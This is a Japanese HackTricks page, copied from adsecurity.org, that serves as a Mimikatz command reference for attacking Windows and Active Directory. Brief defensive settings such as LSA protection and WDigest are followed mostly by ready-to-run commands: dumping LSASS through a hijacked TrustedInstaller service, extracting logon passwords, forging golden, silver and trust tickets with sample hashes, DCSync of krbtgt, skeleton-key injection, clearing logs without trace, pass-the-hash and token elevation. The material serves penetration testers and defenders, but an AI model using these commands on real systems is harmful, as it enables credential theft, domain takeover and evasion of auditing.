# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

このページの内容は[adsecurity.org](https://adsecurity.org/?page\_id=1821)からコピーされました。

## メモリ内のLMハッシュとクリアテキスト

Windows 8.1およびWindows Server 2012 R2以降、LMハッシュと「クリアテキスト」パスワードはメモリに保存されなくなりました。

「クリアテキスト」パスワードがLSASSに保存されないようにするには、次のレジストリキーを「0」に設定する必要があります（Digest Disabled）：

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)_

## **Mimikatz＆LSA保護：**

Windows Server 2012 R2およびWindows 8.1には、LSA保護という新機能が含まれています。これには、[Windows Server 2012 R2でLSASSを保護されたプロセスとして有効化](https://technet.microsoft.com/en-us/library/dn408187.aspx)する必要があります（Mimikatzはドライバをバイパスできますが、イベントログにノイズが発生する可能性があります）：

_ローカルセキュリティ権限サーバーサービス（LSASS）プロセスを含むLSAは、ローカルおよびリモートのサインインのユーザーを検証し、ローカルのセキュリティポリシーを強制します。 Windows 8.1オペレーティングシステムは、保護されていないプロセスによるメモリの読み取りとコードインジェクションを防ぐために、LSAに追加の保護を提供します。これにより、LSAが保存および管理する資格情報のセキュリティが向上します。_

LSA保護の有効化：

1. レジストリエディタ（RegEdit.exe）を開き、次のレジストリキーに移動します：HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa。レジストリキーの値を「RunAsPPL」=dword:00000001に設定します。
2. 新しいGPOを作成し、コンピュータの構成、設定、Windowsの設定に移動します。レジストリを右クリックし、新規作成をポイントし、レジストリ項目をクリックします。新しいレジストリプロパティダイアログボックスが表示されます。ハイブリストでHKEY\_LOCAL\_MACHINEをクリックします。キーパスリストでSYSTEM\CurrentControlSet\Control\Lsaに移動します。値名ボックスにRunAsPPLと入力します。値の種類ボックスでREG\_DWORDをクリックします。値データボックスに00000001と入力します。OKをクリックします。

LSA保護により、保護されていないプロセスはLSASSとのやり取りを防止されます。Mimikatzはまだドライバ（"!+"）でこれをバイパスすることができます。

[![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)

### 無効化されたSeDebugPrivilegeのバイパス
デフォルトでは、SeDebugPrivilegeはAdministratorsグループにローカルセキュリティポリシーを介して付与されます。Active Directory環境では、[この特権を削除することが可能です](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5)。これは、コンピュータの構成->ポリシー->Windowsの設定->セキュリティ設定->ローカルポリシー->ユーザー権限の割り当て->デバッグプログラムが空のグループとして定義されている場合です。オフラインのAD接続デバイスでも、この設定は上書きできず、ローカル管理者はメモリのダンプやMimikatzの使用時にエラーが発生します。

ただし、TrustedInstallerアカウントは引き続きメモリのダンプにアクセスでき、[この防御をバイパスするために使用できます](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled)。TrustedInstallerサービスの構成を変更することで、アカウントを実行してProcDumpを使用し、`lsass.exe`のメモリをダンプすることができます。
```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```
[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

このダンプファイルは、攻撃者が制御するコンピュータに外部流出させることができ、そこから資格情報を抽出することができます。
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## メイン

### **イベント**

**EVENT::Clear** – イベントログをクリアする\
[\
![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**EVENT:::Drop** – (_**実験的**_) 新しいイベントを避けるためにイベントサービスをパッチする

[![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

注意:\
privilege::debugを実行してからevent::dropを実行してイベントログをパッチします。その後、Event::Clearを実行してイベントログをクリアしますが、クリアされたイベントログ（1102）はログに記録されません。

### KERBEROS

#### ゴールデンチケット

ゴールデンチケットは、KRBTGT NTLMパスワードハッシュを使用して暗号化および署名されたTGTです。

ゴールデンチケット（GT）は、ドメイン内の任意のユーザー（実在または想像上）をドメイン内の任意のグループのメンバーとして偽装することができます（ほぼ無制限の権限を提供）ドメイン内の任意のリソースに対して。

**Mimikatzゴールデンチケットコマンドリファレンス:**

ゴールデンチケットを作成するためのMimikatzコマンドは「kerberos::golden」です。

* /domain – 完全修飾ドメイン名。この例では「lab.adsecurity.org」です。
* /sid – ドメインのSID。この例では「S-1-5-21-1473643419-774954089-2222329127」です。
* /sids – スプーフしたいアカウント/グループの追加SID。通常、これはルートドメインのEnterprise Adminsグループである「S-1-5-21-1473643419-774954089-5872329127-519」です。[このパラメータは提供されたSIDをSID Historyパラメータに追加します。](https://adsecurity.org/?p=1640)
* /user – 偽装するユーザー名
* /groups (オプション) – ユーザーが所属するグループのRID（最初のものがプライマリグループです）。\
同じアクセスを受けるためにユーザーまたはコンピューターアカウントのRIDを追加します。\
デフォルトのグループ: 513,512,520,518,519は、よく知られた管理者グループ（以下にリストされています）です。
* /krbtgt – ドメインのKDCサービスアカウント（KRBTGT）のNTLMパスワードハッシュ。TGTを暗号化および署名するために使用されます。
* /ticket (オプション) – ゴールデンチケットファイルを後で使用するために保存するパスと名前を指定するか、/pttを使用してゴールデンチケットを直ちにメモリに注入します。
* /ptt – /ticketの代わりに、このオプションを使用して偽造されたチケットを直ちにメモリに注入します。
* /id (オプション) – ユーザーRID。Mimikatzのデフォルトは500です（デフォルトのAdministratorアカウントRID）。
* /startoffset (オプション) – チケットが利用可能になる開始オフセット（このオプションを使用する場合、通常は-10または0に設定されます）。Mimikatzのデフォルト値は0です。
* /endin (オプション) – チケットの有効期間。Mimikatzのデフォルト値は10年（約5,262,480分）です。Active DirectoryのデフォルトのKerberosポリシー設定は10時間（600分）です。
* /renewmax (オプション) – 更新とともにチケットの最大有効期間。Mimikatzのデフォルト値は10年（約5,262,480分）です。Active DirectoryのデフォルトのKerberosポリシー設定は7日間（10,080分）です。
* /sids (オプション) – ADフォレストのEnterprise AdminsグループのSIDに設定されます（\[ADRootDomainSID]-519）。これにより、ADフォレスト内のすべてのドメインでAD管理者権限をスプーフできます。
* /aes128 – AES128キー
* /aes256 – AES256キー

ゴールデンチケットのデフォルトグループ:

* ドメインユーザーSID: S-1-5-21\<DOMAINID>-513
* ドメイン管理者SID: S-1-5-21\<DOMAINID>-512
* スキーマ管理者SID: S-1-5-21\<DOMAINID>-518
* Enterprise Admins SID: S-1-5-21\<DOMAINID>-519（これは偽造チケットがフォレストルートドメインで作成された場合にのみ有効ですが、ADフォレスト管理者権限を持つために/sidsパラメータを使用して追加します）
* グループポリシー作成者所有者SID: S-1-5-21\<DOMAINID>-520
```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
[異なるドメイン間のゴールデンチケット](https://adsecurity.org/?p=1640)

#### シルバーチケット

シルバーチケットは、ターゲットサービスアカウント（SPNマッピングによって識別される）のNTLMパスワードハッシュを使用して暗号化および署名されたTGS（TGTと同じ形式）です。

**シルバーチケットを作成するためのMimikatzの例コマンド:**

以下のMimikatzコマンドは、サーバーadsmswin2k8r2.lab.adsecurity.orgのCIFSサービスのためのシルバーチケットを作成します。このシルバーチケットを正常に作成するためには、adsmswin2k8r2.lab.adsecurity.orgのADコンピューターアカウントのパスワードハッシュを、ADドメインのダンプから取得するか、上記のようにローカルシステムでMimikatzを実行して取得する必要があります（_Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit_）。NTLMパスワードハッシュは/rc4パラメーターとともに使用されます。サービスSPNタイプも/serviceパラメーターで特定する必要があります。最後に、対象コンピューターの完全修飾ドメイン名を/targetパラメーターで指定する必要があります。/sidパラメーターにはドメインSIDを忘れずに指定してください。
```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
#### [**信頼チケット**](https://adsecurity.org/?p=1588)

Active Directoryの信頼パスワードハッシュが判明したら、信頼チケットを生成することができます。信頼チケットは、互いに信頼する2つのドメイン間で共有されるパスワードを使用して作成されます。
[信頼チケットに関する詳細な情報](https://adsecurity.org/?p=1588)

**信頼パスワード（信頼キー）のダンプ**
```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```
**Mimikatzを使用して偽の信頼チケット（異なる領域のTGT）を作成する**

Mimikatzを使用して、信頼チケットを偽造します。このチケットには、チケット保持者がADフォレストのエンタープライズ管理者であることが記載されています（Mimikatzの信頼間でのSIDHistory、"sids"を利用して、私がMimikatzに"貢献"したものです）。これにより、子ドメインから親ドメインへの完全な管理アクセスが可能になります。なお、このアカウントは実際にはどこにも存在しなくても構いません。それは実質的には信頼間のゴールデンチケットです。
```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```
トラストチケットの特定の必須パラメーター：

* \*\*/\*\*target – ターゲットドメインのFQDN。
* \*\*/\*\*service – ターゲットドメインで実行されているKerberosサービス（krbtgt）。
* \*\*/\*\*rc4 – サービスKerberosサービスアカウント（krbtgt）のNTLMハッシュ。
* \*\*/\*\*ticket – 後で使用するために偽造されたチケットファイルを保存するためのパスと名前を指定するか、/pttを使用してゴールデンチケットを直ちにメモリに注入します。

#### **さらにKERBEROS**

**KERBEROS::List** – ユーザーのメモリ内にあるすべてのユーザーチケット（TGTおよびTGS）をリストします。現在のユーザーのチケットのみ表示するため、特別な特権は必要ありません。\
「klist」と同様の機能です。

**KERBEROS::PTC** – キャッシュを渡す（NT6）\
Mac OS、Linux、BSD、Unixなどの\*NixシステムはKerberosの資格情報をキャッシュします。このキャッシュされたデータはMimikatzを使用してコピーして渡すことができます。また、ccacheファイルにKerberosチケットを注入するのにも便利です。

Mimikatzのkerberos::ptcの良い例は、[PyKEKを使用してMS14-068を攻撃する場合](https://adsecurity.org/?p=676)です。PyKEKはccacheファイルを生成し、kerberos::ptcを使用してMimikatzに注入することができます。

[![Mimikatz-PTC-PyKEK-ccacheFile](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)

**KERBEROS::PTT** – チケットを渡す\
[Kerberosチケットが見つかった後](https://adsecurity.org/?p=1667)、別のシステムにコピーして現在のセッションに渡すことで、ドメインコントローラーとの通信なしにログオンをシミュレートすることができます。特別な権限は必要ありません。\
SEKURLSA::PTH（Pass-The-Hash）と同様の機能です。

* /filename – チケットのファイル名（複数指定可能）
* /diretory – ディレクトリパス。内部のすべての.kirbiファイルが注入されます。

[![KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)

**KERBEROS::Purge** – すべてのKerberosチケットを削除します\
「klist purge」の機能と同様です。チケット（PTC、PTTなど）を渡す前にこのコマンドを実行して、正しいユーザーコンテキストが使用されるようにします。

[![Mimikatz-Kerberos-Purge](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)

**KERBEROS::TGT** – 現在のユーザーの現在のTGTを取得します。

[![Mimikatz-Kerberos-TGT](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)

### LSADUMP

**LSADUMP**::**DCShadow** – 現在のマシンをDCとして設定し、DC内で新しいオブジェクトを作成できるようにします（永続的な方法）。\
これには完全なAD管理権限またはKRBTGTパスワードハッシュが必要です。\
DCShadowは、レプリケーションの目的で一時的にコンピュータを「DC」として設定します。

* ADフォレストの構成パーティションに2つのオブジェクトを作成します。
* 使用されるコンピュータのSPNに「GC」（グローバルカタログ）と「E3514235-4B06-11D1-AB04-00C04FC2DCD2」（ADレプリケーション）を含めます。Kerberosサービスプリンシパル名に関する詳細は、[ADSecurity SPNセクション](https://adsecurity.org/?page\_id=183)を参照してください。
* DrsReplicaAddおよびKCCを介して更新をDCにプッシュします。
* 構成パーティションから作成されたオブジェクトを削除します。

**LSADUMP::DCSync** – DCにオブジェクトの同期を要求し（アカウントのパスワードデータを取得する）、[ドメイン管理者、ドメイン管理者、またはカスタムデリゲーションのメンバーシップが必要です。](https://adsecurity.org/?p=1729)

Mimikatzには、2015年8月に追加された主な機能として、「DCSync」があります。これにより、対象のドメインコントローラーからアカウントのパスワードデータを要求することができます。

**DCSyncオプション:**

* /all – ドメイン全体のデータをDCSyncで取得します。
* /user – データを取得したいユーザーのユーザーIDまたはSID。
* /domain（オプション） – Active DirectoryドメインのFQDN。Mimikatzはドメイン内のDCに接続するためにDCを検出します。このパラメーターが指定されていない場合、Mimikatzは現在のドメインをデフォルトとします。
* /csv – csv形式でエクスポートします。
* /dc（オプション） – DCSyncが接続してデータを収集するドメインコントローラーを指定します。

/guidパラメーターもあります。

**DCSyncコマンドの例:**

rd.adsecurity.orgドメインのKRBTGTユーザーアカウントのパスワードデータを取得する：\
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt" exit_

rd.adsecurity.orgドメインのAdministratorユーザーアカウントのパスワードデータを取得する：\
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator" exit_

lab.adsecurity.orgドメインのADSDC03ドメインコントローラーコンピューターアカウントのパスワードデータを取得する：\
_Mimikatz "lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$" exit_

**LSADUMP::LSA** – LSAサーバーにSAM/ADエンタープライズを取得するように要求します（通常、フライ上のパッチまたはインジェクト）。データの一部を取得するには/patchを使用し、すべてを取得するには/injectを使用します。_システムまたはデバッグ権限が必要です。_

* /inject – LSASSをインジェクトして資格情報を抽出します。
* /name – 対象のユーザーアカウントのアカウント名
* /id – 対象のユーザーアカウントのRID
* /patch – LSASSをパッチします。

サービスアカウントは通常、ドメイン管理者（または同等の権限）のメンバーであるか、最近ドメイン管理者がコンピュータにログオンしていた場合、攻撃者は資格情報をダンプすることができます。これらの資格情報を使用して、攻撃者はドメインコントローラーにアクセスし、KRBTGTアカウントのNTLMハッシュを取得することができます。これはKerberosゴールデンチケットの作成に使用されます。
```
mimikatz lsadump::lsa /inject exit
```
**LSADUMP::NetSync**

NetSyncは、DCコンピューターアカウントのパスワードデータを使用して、シルバーチケットを介してドメインコントローラーになりすまし、ターゲットアカウントの情報（パスワードデータを含む）をDCSyncする簡単な方法を提供します。

**LSADUMP::SAM** - SAMエントリを復号化するためのSysKeyを取得します（レジストリまたはハイブから）。SAMオプションは、ローカルのセキュリティアカウントマネージャー（SAM）データベースに接続し、ローカルアカウントの資格情報をダンプします。

**LSADUMP::Secrets** - SysKeyを取得して、SECRETSエントリ（レジストリまたはハイブから）を復号化します。

**LSADUMP::SetNTLM** - サーバーに対して1つのユーザーの新しいパスワード/NTLMを設定するように要求します。

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) - LSAサーバーに対して信頼認証情報（通常またはパッチ適用時）を取得するように要求します。

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) - ドメインコントローラーのLSASSプロセスにスケルトンキーを注入します。
```
"privilege::debug" "misc::skeleton"
```
### PRIVILEGE

**PRIVILEGE::Backup** – バックアップ特権/権限を取得します。デバッグ権限が必要です。

**PRIVILEGE::Debug** – デバッグ権限を取得します（これまたはローカルシステム権限は、多くのMimikatzコマンドで必要です）。

### SEKURLSA

**SEKURLSA::Credman** – 資格情報マネージャーをリストします。

**SEKURLSA::Ekeys** – Kerberos暗号キーをリストします。

**SEKURLSA::Kerberos** – 認証されたすべてのユーザー（サービスおよびコンピューターアカウントを含む）のKerberos資格情報をリストします。

**SEKURLSA::Krbtgt** – ドメインのKerberosサービスアカウント（KRBTGT）のパスワードデータを取得します。

**SEKURLSA::SSP** – SSP資格情報をリストします。

**SEKURLSA::Wdigest** – WDigest資格情報をリストします。

**SEKURLSA::LogonPasswords** – 利用可能なプロバイダーの資格情報をリストします。通常、最近ログオンしたユーザーとコンピューターの資格情報が表示されます。

- 現在ログオンしている（または最近ログオンした）アカウントのパスワードデータをLSASSにダンプします。ユーザーの資格情報のコンテキストで実行されているサービスも含まれます。
- アカウントのパスワードは、逆向きに格納されています。メモリ内に格納されている場合（Windows 8.1/Windows Server 2012 R2以前はそうでした）、表示されます。Windows 8.1/Windows Server 2012 R2では、ほとんどの場合、アカウントのパスワードはこの方法で格納されません。ただし、KB2871997は、Windows 7、Windows 8、Windows Server 2008R2、およびWindows Server 2012にこのセキュリティ機能を「バックポート」します。ただし、KB2871997を適用した後、コンピューターには追加の設定が必要です。
- 管理者アクセス（デバッグ権限を持つ）またはローカルシステム権限が必要です。

**SEKURLSA::Minidump** – LSASSのミニダンププロセスコンテキストに切り替えます（lsassのダンプを読み取ります）。

**SEKURLSA::Pth** – パス・ザ・ハッシュおよびオーバーパス・ザ・ハッシュ（別名：キーのパス）。

_Mimikatzは、NTLMハッシュを使用してプロセスを別の資格情報で実行するための「パス・ザ・ハッシュ」として知られる操作を実行できます。これにより、偽のアイデンティティでプロセスを開始し、偽の情報（偽のパスワードのNTLMハッシュ）を実際の情報（実際のパスワードのNTLMハッシュ）で置き換えます。_

- /user – 擬似化したいユーザー名です。Administratorはこのよく知られたアカウントの名前ではないことに注意してください。
- /domain – 完全修飾ドメイン名です。ドメインがない場合、またはローカルユーザー/管理者の場合は、コンピューター名、サーバー名、ワークグループなどを使用します。
- /rc4または/ntlm – オプション – ユーザーのパスワードのRC4キー/NTLMハッシュです。
- /run – オプション – 実行するコマンドラインです。デフォルトは: シェルを持つためにcmdです。

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** – 最近認証されたすべてのユーザー、ユーザーアカウントのコンテキストで実行されているサービス、およびローカルコンピュータのADコンピュータアカウントを含む、すべての利用可能なKerberosチケットをリストします。\
kerberos::listとは異なり、sekurlsaはメモリの読み取りを使用しており、キーのエクスポート制限の対象ではありません。sekurlsaは他のセッション（ユーザー）のチケットにアクセスできます。

- /export – オプション – チケットは.kirbiファイルにエクスポートされます。ユーザーのLUIDとグループ番号（0 = TGS、1 = クライアントチケット（？）、2 = TGT）で始まります。

LSASSからの資格情報のダンプと同様に、sekurlsaモジュールを使用して、システム上のすべてのKerberosチケットデータを取得できます。これには、管理者またはサービスに属するチケットも含まれます。\
これは、ユーザーがバックエンドのSQLサーバーにアクセスするために使用するKerberos委任が構成されたWebサーバーを攻撃者が侵害した場合に非常に便利です。これにより、攻撃者はそのサーバー上のメモリ内のすべてのユーザーチケットをキャプチャして再利用できます。

コマンド: _mimikatz sekurlsa::tickets exit_

- システム上のすべての認証されたKerberosチケットをダンプします。
- 管理者アクセス（デバッグ）またはローカルシステム権限が必要です。

### **SID**

MimikatzのSIDモジュールは、MISC::AddSIDを置き換えます。SID::Patchを使用してntdsサービスをパッチします。

**SID::add** – オブジェクトのSIDHistoryにSIDを追加します。

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** – オブジェクトのSIDを変更します。

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

MimikatzのTokenモジュールは、Windowsの認証トークンとのやり取りを可能にし、既存のトークンを取得および模倣することができます。

**TOKEN::Elevate** – トークンを模倣します。デフォルトでは、権限をSYSTEMに昇格させるか、Windows APIを使用してボックス上のドメイン管理者トークンを見つけます。\
_管理者権限が必要です。_

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

ボックス上でドメイン管理者の資格情報を見つけ、そのトークンを使用します: _token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** – システムのすべてのトークンをリストします。

### **TS**

**TS::MultiRDP** – （実験的）複数のユーザーを許可するためにターミナルサーバーサービスをパッチします。

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content
### Vault

`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - 予定されたタスクのパスワードを取得する

\
\
\\

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
